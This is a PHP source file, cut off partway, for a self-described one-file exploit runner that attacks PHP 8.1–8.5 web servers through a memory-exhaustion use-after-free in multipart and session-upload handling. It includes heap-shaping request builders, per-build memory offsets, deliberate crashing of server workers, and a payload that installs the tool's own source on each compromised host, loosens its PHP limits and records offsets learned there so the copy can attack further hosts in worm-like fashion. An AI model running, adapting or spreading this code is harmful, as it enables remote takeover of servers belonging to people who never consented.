<?php
/**
 * php2fix.php -- one-file php2shell runner and "fixer", PHP 8.1 .. 8.5.
 *
 *   GET  /php2fix.php          -> HTML form (target address + options)
 *   POST /php2fix.php          -> runs the exploit against the target
 *   GET  /php2fix.php?txt      -> this file's own source as text/plain, so a
 *                                 payload can fetch and install it verbatim
 *
 * The payload installed on the target does two things:
 *   1. GETs this page as plain PHP (`?txt`) and writes it on the target
 *      (default <docroot>/php2fix.php), so the target keeps a copy;
 *   2. patches the running PHP: a PerDir `.user.ini` with
 *      memory_limit=-1, max_execution_time=0 (plus the two ini settings the
 *      chain itself needs), which is what lets the installed copy do the work
 *      from the target later on.  The tool additionally patches *itself* at
 *      runtime (ini_set / set_time_limit) because it buffers 33 MB bodies and
 *      keeps ~150 sockets open.
 *
 * WHERE memory_limit=-1 IS RIGHT, AND WHERE IT IS NOT
 *   - For the tool's own process: -1 is the right universal setting, it is
 *     what lets a web request build the 33 MB leak body and run for minutes.
 *   - For a host you still want to attack with this chain: -1 is fatal.  The
 *     chain *needs* the request to hit the memory limit (that OOM is the UAF).
 *     With -1 nothing ever OOMs, so no state is left dangling.  If you point
 *     the installed copy at its own host, remove `.user.ini` first; the tool
 *     warns about this.
 *
 * Language level: written against the 8.1 baseline (no 8.2+ features), so the
 * same file runs unchanged on 8.1 .. 8.5.
 */

declare(strict_types=1);

/* ---------------------------------------------------------------- ?txt ---- */
if (isset($_GET['txt'])) {
    // Serve our own source, with one lineage line (see p2f_self_source).
    $src = p2f_self_source();
    header('Content-Type: text/plain; charset=utf-8');
    header('Content-Disposition: inline; filename="php2fix.php"');
    header('Cache-Control: no-store');
    echo $src;
    exit;
}


/** This file's source with one lineage line added: what gets installed. */
function p2f_self_source(): string
{
    $src = (string) file_get_contents(__FILE__);
    $srv = gethostname() ?: 'server';
    $url = (($_SERVER['HTTPS'] ?? '') === 'on' ? 'https://' : 'http://')
         . ($_SERVER['HTTP_HOST'] ?? 'localhost')
         . ($_SERVER['SCRIPT_NAME'] ?? '/php2fix.php');
    $line = ' * I got fixed by ' . $srv . ' (' . $url . ') at '
          . gmdate('Y-m-d\TH:i:s\Z');
    // strrpos + a sentinel that only exists in the trailing block: a plain
    // strpos() also matches this very code and injects the line mid-file.
    $at = strrpos($src, '/* P2F-LINEAGE-BEGIN');
    if ($at !== false) {
        $nl = strpos($src, "\n", $at);
        if ($nl !== false) {
            $src = substr($src, 0, $nl + 1) . $line . "\n" . substr($src, $nl + 1);
        }
    }
    return $src;
}


/* ---------------------------------------------------------- ?learn= ------
 * Record build knobs in this copy, so `?txt` from here on serves them.
 *
 * SECURITY: this is the only endpoint that writes executable-adjacent content,
 * and it is reachable by anyone who can talk to this copy, so it is deliberately
 * narrow:
 *   - the version must equal this process's PHP_VERSION;
 *   - the three offsets must be bare hex (1-8 digits) and the chain a known tag,
 *     i.e. nothing but numbers can be stored;
 *   - the source label is clamped to [A-Za-z0-9._-] so it cannot close the
 *     comment block and inject code (a hostile hostname containing the
 *     comment terminator followed by a function call would otherwise do
 *     exactly that -- which is how this very comment once broke the file);
 *   - entries land inside the `/* P2F-KNOWN` comment only, at most 32 of them,
 *     and never override a built-in;
 *   - worst case for a hostile caller is therefore a *candidate* offset set that
 *     costs one failed attempt, never code execution on a copy that installs it.
 */
if (isset($_GET['learn'])) {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    $v = (string) ($_GET['v'] ?? '');
    $z = (string) ($_GET['z'] ?? '');
    $f = (string) ($_GET['f'] ?? '');
    $o = (string) ($_GET['s'] ?? '');
    $c = (string) ($_GET['c'] ?? 'a2');
    if (!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}$/', $v) || $v !== PHP_VERSION
        || !preg_match('/^[0-9a-fA-F]{1,8}$/', $z)
        || !preg_match('/^[0-9a-fA-F]{1,8}$/', $f)
        || !preg_match('/^[0-9a-fA-F]{1,8}$/', $o)
        || !in_array($c, ['a2', 'a2s'], true)) {
        echo 'rejected: need v=<PHP_VERSION> z=<hex> f=<hex> s=<hex> c=a2|a2s';
        exit;
    }
    $srcHost = preg_replace('/[^A-Za-z0-9._-]/', '', (string) gethostname());
    $srcHost = substr($srcHost !== '' ? $srcHost : '?', 0, 32);
    $base = '';
    $maps = @file_get_contents('/proc/self/maps');
    if (is_string($maps) && preg_match('~(\S*libphp\S*)~', $maps, $m)) {
        $base = ' base=' . preg_replace('/[^A-Za-z0-9._\/-]/', '', $m[1]);
    }
    $id = p2f_build_id();
    $line = sprintf(' * v=%s id=%s z=0x%s f=0x%s s=0x%s c=%s src=%s',
                    $v, $id, $z, $f, $o, $c, $srcHost);
    $text = (string) file_get_contents(__FILE__);
    $at = strrpos($text, '/* P2F-KNOWN');
    if ($at === false || strpos(substr($text, $at), '*/') === false) {
        echo 'no P2F-KNOWN block';
        exit;
    }
    $block = substr($text, $at);
    if (strpos($block, 'id=' . $id . ' z=0x' . $z) !== false) {
        echo 'already-known ' . $v;
        exit;
    }
    if (preg_match_all('/^ \* v=/m', $block) >= 32) {
        echo 'refused: knowledge block full';
        exit;
    }
    $nl = strpos($text, "\n", $at);
    $text = substr($text, 0, $nl + 1) . $line . "\n" . substr($text, $nl + 1);
    echo @file_put_contents(__FILE__, $text)
        ? 'learned v=' . $v . ' id=' . $id . $base : 'write-failed';
    exit;
}


/* ---------------------------------------------------------- ?patch= ------
 * "Fix" this host's PHP so the copy living here can run the exploit itself.
 * Called on a host that has just been taken over, by the copy on that host.
 *
 * It checks what is set, tries to raise the limits for the *current* request and
 * writes a per-directory `.user.ini` next to this script so every later request
 * in this directory inherits it.  Only a fixed set of ini settings is written -
 * nothing from the request is used.
 *
 * Caveat, and the reason this is a separate step: memory_limit=-1 makes a host
 * UN-exploitable from then on (the chain needs the OOM to arm).  Patch a host
 * only after it has been taken over.
 */
if (isset($_GET['patch'])) {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    $before = [
        'memory_limit' => (string) ini_get('memory_limit'),
        'max_execution_time' => (string) ini_get('max_execution_time'),
    ];
    // current request: works for both settings at runtime
    @ini_set('memory_limit', '-1');
    @ini_set('max_execution_time', '0');
    @set_time_limit(0);
    $dir = __DIR__;
    $ini = $dir . '/.user.ini';
    $body = "memory_limit=-1\nmax_execution_time=0\nmax_input_time=-1\n"
          . "file_uploads=On\nsession.upload_progress.enabled=On\n";
    $written = false;
    if (is_writable($dir) || (file_exists($ini) && is_writable($ini))) {
        $written = (bool) @file_put_contents($ini, $body);
        if ($written) {
            @chmod($ini, 0644);
        }
    }
    printf("memory_limit was %s, now %s (this request)\n",
           $before['memory_limit'], (string) ini_get('memory_limit'));
    printf("max_execution_time was %s, now %s\n",
           $before['max_execution_time'], (string) ini_get('max_execution_time'));
    printf("user.ini: %s %s\n", $written ? 'written' : 'NOT writable',
           $written ? $ini : $dir);
    printf("note: a .user.ini takes effect on the next request; a node with it set\n"
         . "      can no longer be taken over by this chain (the OOM is what arms it)\n");
    exit;
}

/* --------------------------------------------------------- ?whoami= -----
 * Returns this worker's pid, so the pool can be measured from the outside.
 */
if (isset($_GET['whoami'])) {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    echo getmypid();
    exit;
}


/* --------------------------------------------------------- ?whoami= -----
 * Returns this worker's pid, so the pool can be measured from the outside.
 */
if (isset($_GET['whoami'])) {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    echo getmypid();
    exit;
}

/* ------------------------------------------------- dev/prod: ?do= ? ------
 * The payload command must stay tiny: the command string is delivered inside a
 * fake zend_string that lives in the 384-byte `ht` value, so anything beyond
 * ~230 bytes is silently truncated and the RCE "does nothing".  The command
 * therefore only fetches and evals *this* endpoint, which does the work.
 */
if (isset($_GET['do']) || isset($_GET['d'])) {
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');
    // Self-contained on purpose: the generated code *embeds* the source
    // (base64), so installing needs no second HTTP request.  A nested fetch
    // deadlocks against any single-process server, including this one.
    $src = p2f_self_source();
    $want = (string) ($_GET['p'] ?? '');
    $cands = $want !== '' ? [$want] : [
        '/var/www/html/php2fix.php', '/var/www/php2fix.php',
        '/app/public/php2fix.php', '/srv/www/php2fix.php',
    ];
    $markerName = (string) ($_GET['m'] ?? '/p2f-marker.txt');
    echo '$c=' . var_export($cands, true) . ';'
       . '$c[]=getcwd()."/php2fix.php";'
       . '$s=base64_decode(' . var_export(base64_encode($src), true) . ');'
       . '$m=' . var_export($markerName, true) . ';'
       . '$p=' . (!empty($_GET['ini']) ? '1' : '0') . ';'
       . '$o="no-writable";'
       . 'foreach($c as $f){$d=dirname($f);'
       . 'if(!is_dir($d)||!is_writable($d))continue;'
       // A pre-existing file we do not own (e.g. 0644 root) cannot be written
       // even though the directory is writable: unlink it first (allowed by the
       // directory permission) and write a fresh one.
       . 'if(file_exists($f)&&!is_writable($f)){@unlink($f);}'
       . 'if(@file_put_contents($f,$s)){$o="installed:".$f;@chmod($f,0644);'
       . '@file_put_contents($d.$m,"p2f ".$o." php=".PHP_VERSION." bin=".PHP_BINARY'
       . '." pid=".getmypid()." host=".gethostname());'
       . 'if($p){@file_put_contents($d."/.user.ini","memory_limit=-1\nmax_execution_time=0\n");'
       . '$o.="+ini";}break;}}'
       . 'if($o==="no-writable"){@file_put_contents(sys_get_temp_dir()."/p2f-installed.php",$s);$o="tmp-only";}'
       . 'echo $o;';
    exit;
}
?>

<?php
/* ------------------------------------------------------------- constants --- */
/**
 * Build fingerprint.
 *
 * The same PHP_VERSION can map to several different offset sets (compiler flags,
 * ZTS, debug, patches), so a version string is NOT the identity of an offset set.
 * This fingerprint tries to name the build: version, thread safety, debug, arch
 * and the size of the mapped libphp.  Entries learned from a target carry it, and
 * the driver tries every known set for a version until one lands.
 */
function p2f_build_id(): string
{
    $lib = '';
    $maps = @file_get_contents('/proc/self/maps');
    if (is_string($maps) && preg_match('~(\S*libphp\S*)~', $maps, $m)) {
        $lib = $m[1] . ':' . (string) @filesize($m[1]);
    }
    return substr(sha1(implode('|', [
        PHP_VERSION, PHP_ZTS ? 'zts' : 'nts', PHP_DEBUG ? 'debug' : 'release',
        php_uname('m'), PHP_SAPI, $lib,
    ])), 0, 10);
}

/**
 * Known offset sets, in try-order.
 *
 * `/* P2F-KNOWN` lines look like
 *     * v=8.4.26 id=ab12cd34ef z=0x65eb60 f=0x465370 s=0xf8398 c=a2 src=host
 * and are appended by ?learn= after a run that worked.  Built-ins come first and
 * are never overwritten; every extra set for the same version is tried in turn.
 */
function p2f_version_sets(string $ver): array
{
    $sets = [];
    if (isset(P2F_BUILTIN[$ver])) {
        $sets[] = P2F_BUILTIN[$ver];
    }
    $text = (string) @file_get_contents(__FILE__);
    $at = strrpos($text, '/* P2F-KNOWN');
    if ($at !== false) {
        $body = substr($text, $at, 262144);
        $end = strpos($body, '*/');
        if ($end !== false) {
            $body = substr($body, 0, $end);
        }
        foreach (preg_split('/\R/', $body) as $line) {
            if (!preg_match('/\*\s*v=(\d+\.\d+\.\d+)\s+id=(\w*)\s+'
                            . 'z=(0x[0-9a-fA-F]+)\s+f=(0x[0-9a-fA-F]+)\s+'
                            . 's=(0x[0-9a-fA-F]+)\s+c=(a2|a2s)\b/', $line, $m)) {
                continue;
            }
            if ($m[1] !== $ver) {
                continue;
            }
            $sets[] = [
                'zdtor' => (int) hexdec(substr($m[3], 2)),
                'zif' => (int) hexdec(substr($m[4], 2)),
                'soff' => (int) hexdec(substr($m[5], 2)),
                'chain' => $m[6],
                'id' => $m[2],
                // same series => reuse the closest measured shape; only the three
                // offsets differ between builds
                'a1' => P2F_BUILTIN['8.4.26']['a1'],
                'qs' => 12, 'page' => 0x138, 'fake_len' => 0xC0000,
            ];
        }
    }
    return $sets;
}

/** Versions we can name at all (built-ins plus anything learned). */

function p2f_version_names(): array
{
    $names = array_keys(P2F_BUILTIN);
    $text = (string) @file_get_contents(__FILE__);
    $at = strrpos($text, '/* P2F-KNOWN');
    if ($at !== false && preg_match_all('/\*\s*v=(\d+\.\d+\.\d+)/',
                                        substr($text, $at, 262144), $m)) {
        $names = array_values(array_unique(array_merge($names, $m[1])));
    }
    sort($names);
    return $names;
}

/* ------------------------------------------------------------- constants --- */
/**
 * Version table = the built-in, measured builds plus whatever a *copy* of this
 * file has learned.  Learned entries live in the trailing `/* P2F-KNOWN` block,
 * one per line, and travel with the file: a payload that is installed on a new
 * build records its knobs there, so the next `?txt` from that copy already
 * knows them.  Nothing is added unless it is new, so the block cannot bloat.
 */
function p2f_versions(): array
{
    static $cache = null;
    if ($cache !== null) {
        return $cache;
    }
    $cache = P2F_BUILTIN;
    $text = (string) file_get_contents(__FILE__);
    $at = strrpos($text, '/* P2F-KNOWN');
    if ($at === false) {
        return $cache;
    }
    $body = substr($text, $at, 65536);
    $end = strpos($body, '*/');
    if ($end !== false) {
        $body = substr($body, 0, $end);
    }
    foreach (preg_split('/\R/', $body) as $line) {
        if (!preg_match('/^\s*\*\s*(\d+\.\d+\.\d+)\s+'
                        . '(0x[0-9a-fA-F]+)\s+(0x[0-9a-fA-F]+)\s+'
                        . '(0x[0-9a-fA-F]+)\s+(a2|a2s)\b/', $line, $m)) {
            continue;
        }
        if (isset($cache[$m[1]])) {
            continue;                       // built-in wins; never overwrite
        }
        $cache[$m[1]] = [
            'zdtor' => (int) hexdec(substr($m[2], 2)),
            'zif' => (int) hexdec(substr($m[3], 2)),
            'soff' => (int) hexdec(substr($m[4], 2)),
            'chain' => $m[5],
            // learned entries reuse the closest measured shape; only the three
            // offsets differ between builds of the same series
            'a1' => P2F_BUILTIN['8.4.26']['a1'],
            'qs' => 12, 'page' => 0x138, 'fake_len' => 0xC0000,
        ];
    }
    return $cache;
}


const P2F_BOUNDARY = 'CCCCCCCCCC';   // 10 bytes, same as the measured chain

/** Per-build constants.  zdtor/zif are libphp symbol offsets, soff is where the
 *  384-byte fake-zend_array value lands inside the main chunk.  Measured on the
 *  trixie builds; only these four numbers differ between them. */
const P2F_BUILTIN = [
    '8.2.34' => ['zdtor' => 0x487650, 'zif' => 0x39B8A0, 'soff' => 0xF9398,
                 'a1' => ['parts' => 860, 'depth' => 64, 'fillers' => 14, 'big' => 78,
                          'big_len' => 8000, 'burners' => 21, 'progress_len' => 10,
                          'bin12' => 12, 'ctype1_len' => 4000],
                 'qs' => 15, 'page' => 0x138, 'fake_len' => 0xC0000, 'chain' => 'a2'],
    '8.3.35' => ['zdtor' => 0x49EC50, 'zif' => 0x3AC080, 'soff' => 0xF9398,
                 'a1' => ['parts' => 860, 'depth' => 64, 'fillers' => 14, 'big' => 78,
                          'big_len' => 8000, 'burners' => 21, 'progress_len' => 10,
                          'bin12' => 12, 'ctype1_len' => 4000],
                 'qs' => 15, 'page' => 0x138, 'fake_len' => 0xC0000, 'chain' => 'a2'],
    '8.4.26' => ['zdtor' => 0x65EB60, 'zif' => 0x465370, 'soff' => 0xF8398,
                 'a1' => ['parts' => 860, 'depth' => 64, 'fillers' => 14, 'big' => 78,
                          'big_len' => 8000, 'burners' => 21, 'progress_len' => 10,
                          'bin12' => 0, 'ctype1_len' => 4000],
                 'qs' => 12, 'page' => 0x138, 'fake_len' => 0xC0000, 'chain' => 'a2'],
    '8.5.11' => ['zdtor' => 0x7B47A0, 'zif' => 0x5996E0, 'soff' => 0xF7398,
                 'a1' => ['parts' => 860, 'depth' => 64, 'fillers' => 14, 'big' => 78,
                          'big_len' => 8000, 'burners' => 21, 'progress_len' => 10,
                          'bin12' => 0, 'ctype1_len' => 4000],
                 'qs' => 12, 'page' => 0x1DC, 'fake_len' => 0xC0000, 'chain' => 'a2s'],
];

/* --------------------------------------------------------------- helpers --- */

function p2f_u32(int $v): string { return pack('V', $v); }
function p2f_u64(int $v): string { return pack('P', $v); }

function p2f_put(string &$s, int $off, string $bytes): void
{
    if ($off < 0 || $off + strlen($bytes) > strlen($s)) {
        return;
    }
    $s = substr_replace($s, $bytes, $off, strlen($bytes));
}

function p2f_part(string $name, string $value = '', ?string $filename = null,
                  ?string $ctype = null): string
{
    $out = '--' . P2F_BOUNDARY . "\r\nContent-Disposition: form-data; name=\""
         . $name . '"';
    if ($filename !== null) {
        $out .= '; filename="' . $filename . '"';
    }
    $out .= "\r\n";
    if ($ctype !== null) {
        $out .= 'Content-Type: ' . $ctype . "\r\n";
    }
    return $out . "\r\n" . $value . "\r\n";
}

function p2f_hex(int $v): string { return '0x' . dechex($v); }

/**
 * 8.5's H derivation (the <= 8.4 driver uses a bucket-vote instead, which is a
 * property of *that* leak shape).  A leaked pointer with a small offset inside
 * its 2 MiB chunk points into a zend_mm_chunk header, so that chunk is the one
 * that owns mm_heap; its base is the H the write stage needs.
 */
function p2f_derive_H(array $counts): ?int
{
    foreach ($counts as $ptr => $n) {
        if (($ptr & 0x1FFFFF) < 0x1000) {
            return $ptr & ~0x1FFFFF;
        }
    }
    return null;
}

/* ============================================================== the tool === */

final class P2F
{
    public string $host = '127.0.0.1';
    public int $port = 80;
    public string $path = '/index.php';
    public string $version = '';        // '' = auto-detect from the leak
    /** how far to sweep the cycle offset between a stage pair */
    public int $gap = 6;
    /** bogus writes used to crash every child before a pair (see refresh()) */
    public int $refresh = 8;
    public int $retries = 4;
    public string $callback = '';       // URL the target fetches `?txt` from
    public string $installPath = '/var/www/html/php2fix.php';
    // On by default: a copy that is installed here becomes the next attacker,
    // and running this chain from a web request needs -1 / no time limit.
    public bool $setMemoryLimit = true;
    public string $cmd = '';            // '' = install + patch payload
    public bool $verbose = true;
    public int $timeout = 60;
    // A wedged child (the A stage's OOM can leave one holding our socket) must
    // cost seconds, not minutes: every stage request uses this.
    public float $stageTimeout = 8.0;

    /** @var list<string> */
    public array $log = [];
    private string $marker = '';
    public int $requests = 0;
    public int $lastSent = 0;
    /** run start, for the log timestamps */
    private static ?float $t0 = null;
    // No opcache warm-up on purpose: the A1 has to be the *first* request on a
    // freshly respawned child.  A warm-up makes the child non-pristine, the
    // compile allocations move the OOM site, and the tuned 860/880-part shapes
    // stop arming (measured: warm=1 fails, warm=0 works on the same target).

    public function __construct(array $opt = [])
    {
        foreach ($opt as $k => $v) {
            if (property_exists($this, $k)) {
                $this->$k = $v;
            }
        }
        $this->marker = '/p2f-marker.txt';   // fixed: the short payload
                                             // cannot carry a random name
    }

    public function say(string $msg): void
    {
        self::$t0 ??= microtime(true);
        $line = sprintf('[%6.1fs] %s', microtime(true) - self::$t0, $msg);
        $this->log[] = $line;
        if ($this->verbose) {
            echo htmlspecialchars($line, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'), "\n";
            if (ob_get_level() > 0) {
                @ob_flush();
            }
            @flush();
        }
    }

    /* ------------------------------------------------------------ http ---- */

    /** @return resource|null */
    private function conn(float $timeout)
    {
        $errno = 0;
        $err = '';
        $fp = @stream_socket_client('tcp://' . $this->host . ':' . $this->port,
                                    $errno, $err, $timeout);
        if ($fp === false) {
            return null;
        }
        // NB: (int) $timeout truncates 0.25 to 0, which makes the stream
        // non-blocking and every read return '' -- that silently broke the
        // short probes (they always "failed").  Pass seconds + microseconds.
        $sec = (int) floor($timeout);
        $usec = (int) round(($timeout - $sec) * 1000000);
        stream_set_timeout($fp, $sec, $usec);
        // PHP streams default to an 8 KiB write chunk, so a 1 MiB request goes
        // out as ~128 small writes.  That pacing changes how the target's
        // multipart parser fills its buffers, which moves where the OOM lands:
        // the measured reference client bursts each request in one go, so do
        // the same here.
        @stream_set_chunk_size($fp, 1 << 26);
        @stream_set_write_buffer($fp, 0);
        return $fp;
    }

    /** Send one request; returns the raw response (bounded). */
    public function send(string $path, string $body, bool $chunked = true,
                         int $maxRead = 262144, bool $drain = true,
                         ?float $timeout = null): string
    {
        // Deliberately does NOT pin/top-up: pairs of stages (A1,B1) and (A2,B2)
        // must be adjacent.  A holder opened in between can occupy the child that
        // was just armed, and the next stage then runs in a different child.
        $this->requests++;
        $hdr = 'POST ' . $path . " HTTP/1.1\r\nHost: {$this->host}:{$this->port}\r\n"
             . 'Content-Type: multipart/form-data; boundary=' . P2F_BOUNDARY . "\r\n";
        $hdr .= $chunked
            ? "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
            : 'Content-Length: ' . strlen($body) . "\r\nConnection: close\r\n\r\n";
        $fp = $this->conn($timeout ?? (float) $this->timeout);
        if ($fp === null) {
            $this->say('connect failed');
            return '';
        }
        $resp = '';
        // Build the whole request in memory and hand it to the kernel in large
        // pieces.  Writing the body chunk-by-chunk in lockstep with the server's
        // reads changes the arrival pattern, and the multipart parser's buffer
        // growth with it -- which moves where the OOM lands and silently breaks
        // the chain (measured: identical bodies, different heap shaping).
        // Build the *complete* request in one buffer, then hand it to the kernel
        // in a single write().  Appending in small pieces (or writing piece by
        // piece) lets the sends interleave with the server's reads, which changes
        // how the multipart parser grows its buffers -- and that moves where the
        // OOM lands.  implode() also avoids repeated reallocation of a 33 MB
        // string, which in a -O0/ASan build is real time the server can spend
        // reading half a body.
        $pieces = [$hdr];
        if ($chunked) {
            $len = strlen($body);
            for ($i = 0; $i < $len; $i += 65536) {
                $piece = substr($body, $i, 65536);
                $pieces[] = dechex(strlen($piece)) . "\r\n" . $piece . "\r\n";
            }
            $pieces[] = "0\r\n\r\n";
        } else {
            $pieces[] = $body;
        }
        $req = implode('', $pieces);
        unset($pieces);
        $this->writeAll($fp, $req);
        $resp = $this->readResponse($fp, $maxRead);
        if ($drain) {
            // Let the server finish: the A2 OOM happens *inside* the body read,
            // and the reference client always waits for the connection to end.
            // Cap the wait with a short idle timeout so keep-alive cannot stall.
            @stream_set_timeout($fp, 3);
            while (!feof($fp)) {
                $c = @fread($fp, 65536);
                if ($c === false || $c === '') {
                    $meta = stream_get_meta_data($fp);
                    if (!empty($meta['timed_out']) || feof($fp)) {
                        break;
                    }
                    break;
                }
            }
        }
        @fclose($fp);
        return $resp;
    }


    /**
     * Read the status line + headers (and a bounded slice of the body).
     *
     * Draining to EOF is wrong: Apache may keep the connection open after a
     * response, so a naive "read until close" stalls until the socket timeout
     * (that is what made a single attempt take minutes).  The response headers
     * are also all we need for the leak -- the OOB data is inside the
     * Set-Cookie header -- and receiving them means the request, including its
     * shutdown (where the OOM fires), has already finished.
     */
    private function readResponse($fp, int $maxHead = 4194304, int $maxBody = 65536): string
    {
        $buf = '';
        while (strpos($buf, "\r\n\r\n") === false) {
            $c = @fread($fp, 65536);
            if ($c === false || $c === '') {
                $meta = stream_get_meta_data($fp);
                if (!empty($meta['timed_out']) || feof($fp)) {
                    break;
                }
                continue;
            }
            $buf .= $c;
            if (strlen($buf) > $maxHead) {
                break;
            }
        }
        $sp = strpos($buf, "\r\n\r\n");
        if ($sp === false) {
            return $buf;
        }
        $head = substr($buf, 0, $sp + 4);
        $body = substr($buf, $sp + 4);
        $want = 0;
        if (preg_match('/^Content-Length:\s*(\d+)/mi', $head, $m)) {
            $want = min((int) $m[1], $maxBody);
        }
        while (strlen($body) < $want) {
            $c = @fread($fp, 65536);
            if ($c === false || $c === '') {
                $meta = stream_get_meta_data($fp);
                if (!empty($meta['timed_out']) || feof($fp)) {
                    break;
                }
                continue;
            }
            $body .= $c;
        }
        return $head . $body;
    }

    /** @param resource $fp */
    private function writeAll($fp, string $data): void
    {
        $off = 0;
        $len = strlen($data);
        $stall = 0;
        while ($off < $len) {
            // first attempt hands over the entire buffer in one call
            $n = @fwrite($fp, $off === 0 ? $data : substr($data, $off));
            if ($n === false || $n === 0) {
                // A short write used to return silently, truncating the body:
                // the target then OOMs at a different point and the chain lands
                // nowhere.  Retry briefly, then give up loudly.
                if (++$stall > 200) {
                    $this->say(sprintf('    !! short write: %d/%d bytes', $off, $len));
                    return;
                }
                usleep(5000);
                continue;
            }
            $stall = 0;
            $off += $n;
        }
        $this->lastSent = $len;
    }

    /* ----------------------------------------------------- pool control ---- */

    /** A request that can never finish: it declares a body it never sends, so
     *  its prefork child stays blocked in the body read.  The path is not a
     *  .php file, so occupying a child never enters the PHP VM. */
    /** @return resource|null */
    /**
     * Occupy-and-release `$k` other children.
     *
     * A stock prefork pool hands sequential requests round-robin to its idle
     * children (measured on the official images: five children, StartServers,
     * repeating; the pool only grows past that when requests overlap).  So the
     * two halves of a stage pair land in the same child only when the right
     * number of requests sits between them -- and that number is the pool size,
     * which an attacker cannot see.  We therefore sweep `$k` and let the leak /
     * the marker say which one aligned.
     *
     * The dummy path must not be PHP: a PHP request would run in the free
     * child's VM and move the heap the stages depend on.
     */
    public function gap(int $k): void
    {
        for ($i = 0; $i < $k; $i++) {
            $fp = $this->conn(2.0);
            if ($fp === null) {
                return;
            }
            $this->writeAll($fp, "GET /p2f-nonexistent HTTP/1.1\r\nHost: "
                                 . "{$this->host}:{$this->port}\r\nConnection: close\r\n\r\n");
            @fread($fp, 64);
            @fclose($fp);
        }
    }

    /**
     * Crash every child so the master respawns a pool of cold workers.
     *
     * The stages need a worker whose per-request state is pristine: the dangling
     * struct sits at the default page only on a freshly respawned child and moves
     * once the worker has served a request.  A
     * prefork child that faults is replaced by the master, so deliberately
     * faulting each child converts a warm pool into a cold one -- measured, the
     * leak went from 1/18 warm to 3/3 cold at the same offset.  "Cold" here is
     * the heap/request state, not opcache: the respawned child inherits the
     * master's shared opcache, so no warm-up is wanted or needed.
     *
     * The write body with a bogus fake-array address is exactly such a fault, and
     * it needs no version-specific knowledge beyond which body builder to use.
     */
    public function refresh(callable $bogus): void
    {
        if ($this->refresh <= 0) {
            return;
        }
        $dead = 0;
        for ($i = 0; $i < $this->refresh; $i++) {
            if ($this->send('/index.php', $bogus(), false, 1024, true, 4.0) === '') {
                $dead++;                 // no response = the child faulted
            }
        }
        usleep(500000);
        if ($dead > 0) {
            $this->say(sprintf('  refresh: %d/%d children faulted, master respawns them cold',
                               $dead, $this->refresh));
        }
    }

    /**
     * Offsets to try, stock default first.
     *
     * Every attempt arms a child; arming the same child twice lands in a
     * different state, so the first offset tried on a fresh pool is the one that
     * matters.  The official images ship StartServers=5, hence 4.
     */
    public function gaps(): array
    {
        $first = 4;
        $out = [$first];
        for ($g = 0; $g <= max($this->gap, $first); $g++) {
            if ($g !== $first) {
                $out[] = $g;
            }
        }
        return $out;
    }

    public function a1Body(array $s): string
    {
        $parts  = (int) ($s['parts'] ?? 860);
        $depth  = (int) ($s['depth'] ?? 64);
        $fill   = (int) ($s['fillers'] ?? 14);
        $big    = (int) ($s['big'] ?? 78);
        $bigLen = (int) ($s['big_len'] ?? 8000);
        $burn   = (int) ($s['burners'] ?? 21);
        $prog   = (int) ($s['progress_len'] ?? 10);
        $bin12  = (int) ($s['bin12'] ?? 0);
        $ct1    = (int) ($s['ctype1_len'] ?? 4000);

        $files = '';
        for ($i = 0; $i < $parts; $i++) {
            if ($i === 0) {
                $ctype = str_repeat('C', 103);
                $fname = 'A';
            } elseif ($i === 1) {
                $ctype = str_repeat('C', $ct1);
                $fname = 'A';
            } else {
                $ctype = 'application/octet-stream';
                $fname = '';
            }
            $name = 'files[R' . sprintf('%05d', $i) . str_repeat('K', 90) . ']'
                  . str_repeat('[a]', $depth - 2);
            $files .= '--' . P2F_BOUNDARY . "\r\nContent-Disposition: form-data; name=\""
                    . $name . '"; filename="' . $fname . '"'
                    . "\r\nContent-Type: " . $ctype . "\r\n\r\n";
        }

        $out = p2f_part('PHPSESSID', "\0");
        $out .= $files;                             // files_last = false
        for ($i = 0; $i < $fill; $i++) {
            $out .= p2f_part(substr(str_pad('f' . sprintf('%04d', $i), 103, 'x'), 0, 103),
                             str_repeat('v', 8));
        }
        for ($i = 0; $i < $big; $i++) {
            $out .= p2f_part('b' . sprintf('%04d', $i), str_repeat('B', $bigLen));
        }
        for ($i = 0; $i < $bin12; $i++) {
            $out .= p2f_part('z' . sprintf('%03d', $i), str_repeat('Z', 110));
        }
        for ($i = 0; $i < $burn; $i++) {
            $out .= p2f_part('u' . sprintf('%02d', $i), str_repeat('U', 4000));
        }
        $out .= p2f_part('PHP_SESSION_UPLOAD_PROGRESS', str_repeat('k', $prog));
        return $out . '--' . P2F_BOUNDARY . "--\r\n";
    }

    /** A1 (8.5): the drain fields are `files[sNNNN][x]`, which consume one
     *  256-byte arData each, so the OOM lands inside php_session_send_cookie. */
    public function a1Body85(int $nShallow, array $s): string
    {
        $parts  = (int) ($s['parts'] ?? 860);
        $depth  = (int) ($s['depth'] ?? 64);
        $fill   = (int) ($s['fillers'] ?? 14);
        $big    = (int) ($s['big'] ?? 78);
        $bigLen = (int) ($s['big_len'] ?? 8000);
        $burn   = (int) ($s['burners'] ?? 21);
        $prog   = (int) ($s['progress_len'] ?? 10);

        $files = '';
        for ($i = 0; $i < $parts; $i++) {
            if ($i === 0) {
                $ctype = str_repeat('C', 103);
                $fname = 'A';
            } elseif ($i === 1) {
                $ctype = str_repeat('C', 4000);
                $fname = 'A';
            } else {
                $ctype = 'application/octet-stream';
                $fname = '';
            }
            $name = 'files[R' . sprintf('%05d', $i) . str_repeat('K', 90) . ']'
                  . str_repeat('[a]', $depth - 2);
            $files .= '--' . P2F_BOUNDARY . "\r\nContent-Disposition: form-data; name=\""
                    . $name . '"; filename="' . $fname . '"'
                    . "\r\nContent-Type: " . $ctype . "\r\n\r\n";
        }
        $out = p2f_part('PHPSESSID', "\0") . $files;
        for ($i = 0; $i < $fill; $i++) {
            $out .= p2f_part(substr(str_pad('f' . sprintf('%04d', $i), 103, 'x'), 0, 103),
                             str_repeat('v', 8));
        }
        for ($i = 0; $i < $big; $i++) {
            $out .= p2f_part('b' . sprintf('%04d', $i), str_repeat('B', $bigLen));
        }
        for ($i = 0; $i < $burn; $i++) {
            $out .= p2f_part('u' . sprintf('%02d', $i), str_repeat('U', 4000));
        }
